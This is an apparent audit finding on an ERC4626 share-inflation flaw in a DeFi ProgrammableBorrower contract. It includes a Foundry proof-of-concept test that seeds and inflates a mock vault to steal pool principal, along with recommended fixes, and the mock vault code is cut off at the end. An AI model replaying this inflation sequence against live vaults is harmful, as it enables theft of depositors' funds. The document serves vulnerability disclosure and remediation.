### Title
ERC4626 share inflation lets the programmable borrower deposit pool principal for zero shares - ([File: contracts/strategies/idle/ProgrammableBorrower.sol]) [1](#0-0) 

### Summary
`ProgrammableBorrower.onStartEpoch` deposits every idle underlying token into the configured ERC4626 vault but never validates that the deposit returned economically sufficient shares. [1](#0-0)  An ordinary vault shareholder can seed the vault, donate enough underlying to inflate the asset-per-share ratio, and cause the facility’s deposit to mint zero or near-zero shares. [2](#0-1)  Because the CDO continues to value the position through its strategy-token balance rather than reconciling it with the borrower’s actual vault position, the loss can remain unaccounted after a successful minted-interest `stopEpoch`. [3](#0-2) 

### Finding Description
`onStartEpoch` snapshots `startAssets`, calls `_depositToVault`, and then stores the pre-deposit amount as `epochStartVaultAssets`. [4](#0-3)  `_depositToVault` records `shares = vault.deposit(_assetAmount, address(this))`, but only emits the result and does not reject zero shares, apply a minimum-share bound, or verify `convertToAssets(shares)` covers the deposited principal. [2](#0-1) 

An attacker who is merely a user of the selected ERC4626 vault can perform the standard share-inflation sequence before `startEpoch`: deposit one asset unit to receive one share, donate more than the pool deposit amount directly to the vault, and leave `assets * totalSupply / totalAssets` rounding down to zero when the facility deposits. [5](#0-4)  The attacker can then redeem the single share for both the donation and the facility’s deposit, while `ProgrammableBorrower` holds no shares. [6](#0-5) 

In minted-interest programmable mode, a normal `stopEpoch` only pulls pending withdrawal cash from the borrower and does not recall active principal. [7](#0-6)  With no pending withdrawals and no borrower debt, `onStopEpoch` succeeds even though the vault position is worthless, after which the CDO retains the unchanged strategy-token NAV and unpauses ordinary operations. [8](#0-7) 

### Impact Explanation
The attacker directly steals the pool principal deposited into the ERC4626 vault, less the one-unit seed deposit and gas. [2](#0-1)  For a `1,000,000` underlying deposit, an attacker can hold one share backed by `1,000,001` underlying before the call; the facility receives `floor(1,000,000 * 1 / 1,000,001) == 0` shares, and the attacker’s redemption returns `2,000,001` underlying. [9](#0-8) 

The broken invariant is fair deposit accounting and solvency: the CDO’s strategy-token supply remains fully marked as NAV even though the programmable borrower owns no corresponding vault assets. [3](#0-2)  Later withdrawal requests are issued against that stale NAV and cannot be funded from the programmable borrower, forcing a borrower-default path or leaving claimants unpaid despite no borrower call being malicious. [10](#0-9) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to derive deposit shares from an attacker-controllable `totalAssets / totalSupply` ratio without dead-share, virtual-share, or equivalent inflation protection. [11](#0-10)  It must occur before the facility has a meaningful vault position, such as the first `onStartEpoch` after initialization or after the owner changes to an empty vault. [12](#0-11) 

The attacker does not need owner, manager, borrower, guardian, feeReceiver, queue, KYC, or tranche privileges; ordinary ERC4626 deposit and underlying transfer capabilities are sufficient. [11](#0-10)  Vaults that already mint substantial protected shares or enforce share-price inflation defenses reduce or eliminate reachability, so this is conditional on the deployed vault’s accounting implementation. [13](#0-12) 

### Recommendation
Require every programmable-borrower vault deposit to satisfy an explicit economic slippage bound, not merely a nonzero share count. [2](#0-1)  For example, after `vault.deposit`, compute `vault.convertToAssets(shares)` and revert if it is less than `_assetAmount` minus a tightly bounded rounding allowance; a zero-share result would always fail this check. [6](#0-5) 

Also restrict `setVault` to vault implementations known to include inflation resistance, or require an operator-supplied `minShares` value at a privileged vault-configuration boundary rather than accepting whatever share amount an arbitrary ERC4626 returns. [11](#0-10)  Add a regression test that inflates a permissive ERC4626 before `startEpoch` and asserts `onStartEpoch` reverts instead of leaving the CDO with unbacked strategy-token NAV. [14](#0-13) 

### Proof of Concept
This Foundry test extends the existing programmable-borrower fixture and uses `MockStopEpochLiquidityVault`, whose deposit formula exposes the vulnerable share calculation. [15](#0-14) 

```solidity
// test/foundry/ProgrammableBorrowerCreditVault.t.sol
function testProgrammableBorrowerVaultShareInflationStealsEpochPrincipal() external {
    uint256 amount = 1_000_000 * oneScale;
    address attacker = makeAddr("erc4626Attacker");

    MockStopEpochLiquidityVault vulnerableVault =
        new MockStopEpochLiquidityVault(USDC);

    // Initialize the programmable borrower against the empty vault.
    _setUpProgrammableBorrowerCreditVault(
        FORK_BLOCK,
        address(vulnerableVault)
    );

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    // Attacker seeds one share and inflates assets/share above the pool deposit.
    deal(USDC, attacker, amount + 1);
    vm.startPrank(attacker);
    underlying.approve(address(vulnerableVault), type(uint256).max);
    vulnerableVault.deposit(1, attacker);
    underlying.transfer(address(vulnerableVault), amount);
    vm.stopPrank();

    assertEq(
        vulnerableVault.convertToAssets(1),
        amount + 1,
        "inflated share price not established"
    );

    // LP deposits principal through the CDO.
    deal(USDC, address(this), amount, true);
    underlying.approve(address(cdoEpoch), amount);
    idleCDO.depositAA(amount);

    // Honest manager starts the epoch; ProgrammableBorrower deposits all cash.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertEq(
        vulnerableVault.balanceOf(address(programmableBorrower)),
        0,
        "programmable borrower received zero shares"
    );
    assertEq(
        programmableBorrower.totalUnderlying(),
        0,
        "borrower reports zero assets"
    );

    // The attacker redeems the single seed share for donation plus pool principal.
    vm.prank(attacker);
    vulnerableVault.redeem(1, attacker, attacker);
    assertEq(
        underlying.balanceOf(attacker),
        2 * amount + 1,
        "attacker did not recover donation plus deposit"
    );

    // A normal minted-interest stop succeeds because no cash recall is due.
    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted(), "stop unexpectedly defaulted");
    assertEq(
        cdoEpoch.getContractValue(),
        amount,
        "CDO NAV still ignores the stolen vault principal"
    );

    // A withdrawal request is accepted against the stale NAV.
    cdoEpoch.requestWithdraw(0, address(aaTranche));
    uint256 requested = strategy.withdrawsRequests(address(this));
    assertEq(requested, amount, "withdraw receipt was not recorded");

    // The next epoch has no borrower assets, so the matured receipt causes default.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.defaulted(), "vault theft did not force default");
    assertEq(
        underlying.balanceOf(address(this)),
        0,
        "withdraw receipt unexpectedly paid"
    );
}
```

contract MockStopEpochLiquidityVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public withdrawLimit = type(uint256).max;

  constructor(address _asset) ERC20("Stop Epoch Liquidity Vault", "SELV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }
